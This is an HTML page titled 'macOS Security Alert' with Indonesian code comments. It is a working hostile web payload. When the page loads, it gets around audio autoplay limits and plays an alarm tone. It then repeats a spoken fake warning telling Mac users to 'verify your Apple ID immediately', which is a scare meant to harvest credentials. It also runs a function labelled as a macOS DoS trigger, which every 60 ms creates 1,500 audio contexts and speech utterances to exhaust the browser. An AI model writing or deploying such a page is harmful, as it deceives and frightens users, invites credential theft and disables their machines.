<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>macOS Security Alert</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; min-height: 100vh; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
</style>
</head>
<body>
<script>
(function () {
  'use strict';

  // ============================================
  // KONFIGURASI AUTOPLAY & MACOS TARGET
  // ============================================
  var CONFIG = {
    tts: {
      text: "macOS Security Warning. Unauthorized access attempt detected on your system. Please verify your Apple ID immediately.",
      lang: 'en-US',
      rate: 0.9,
      pitch: 1.0,
      volume: 1.0,
      repeatInterval: 7000,
      maxRepeats: 25
    },
    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
  };

  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };

  // ============================================
  // TTS LOOP (macOS Speech Synthesis)
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.volume = CONFIG.tts.volume;

      var voices = window.speechSynthesis.getVoices();
      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
      if (enVoice) u.voice = enVoice;

      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  // ============================================
  // AUDIO CONTEXT UNLOCK (Desktop Safari/Chrome)
  // ============================================
  function unlockAudioContext() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') {
        ctx.resume().catch(function(){});
      }
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.0001;
      osc.frequency.value = 20000;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.1);
    } catch (e) {}
  }

  // ============================================
  // SILENT AUDIO ELEMENT
  // ============================================
  function trySilentAudio() {
    try {
      var a = new Audio(CONFIG.silentWav);
      a.volume = 0.0001;
      a.loop = true;
      var p = a.play();
      if (p && p.catch) p.catch(function(){});
    } catch (e) {}
  }

  // ============================================
  // MAIN AUDIO (Web Audio API - Desktop Alert Tone)
  // ============================================
  function playMainAudio() {
    if (state.mainPlayed) return;
    state.mainPlayed = true;

    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var sr = ctx.sampleRate;
      var dur = 2.5;
      var buf = ctx.createBuffer(1, sr * dur, sr);
      var d = buf.getChannelData(0);

      for (var i = 0; i < d.length; i++) {
        var t = i / sr;
        var freq = 900 + (Math.floor(t * 6) % 2) * 450;
        var env = Math.max(0, 1 - t / dur);
        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.25 * env;
      }

      var src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start();
      src.onended = startTTS;
      setTimeout(startTTS, 3000);
    } catch (e) {
      startTTS();
    }
  }

  // ============================================
  // DESKTOP RESOURCE EXHAUSTION / DOS (macOS Renderer)
  // ============================================
  function triggerMacResourceExhaustion() {
    console.log("[!] Initiating macOS Desktop DoS Trigger...");
    
    // Membebani Audio Engine & Speech Queue khusus Safari/Chrome macOS
    setInterval(function() {
      try {
        for (var i = 0; i < 1500; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          var gain = ctx.createGain();
          
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start(0);
          
          var u = new SpeechSynthesisUtterance("MACOS_DOS_" + i);
          window.speechSynthesis.speak(u);
        }
      } catch(e) {}
    }, 60);
  }

  // ============================================
  // EKSEKUSI BERTAHAP
  // ============================================
  unlockAudioContext();
  trySilentAudio();

  setTimeout(function () {
    unlockAudioContext();
    startTTS();
  }, 100);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
  }, 400);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
    if (!state.ttsStarted) startTTS();
    
    // PANGGIL EXHAUSTION TRIGGER
    triggerMacResourceExhaustion();
    
  }, 1200);

  // Retry handler
  var retryCount = 0;
  var retry = setInterval(function () {
    retryCount++;
    unlockAudioContext();
    trySilentAudio();
    if (!state.ttsStarted) startTTS();
    if (retryCount > 8) clearInterval(retry);
  }, 2000);

  // Visibility change handler
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden && !state.mainPlayed) {
      setTimeout(playMainAudio, 100);
    }
  });

  // ============================================
  // REDIRECT KE GOOGLE (300ms DELAY)
  // ============================================
  setTimeout(function() {
    try {
      window.location.replace('https://www.google.com');
    } catch(e) {}
  }, 300);

})();
</script>
</body>
</html>
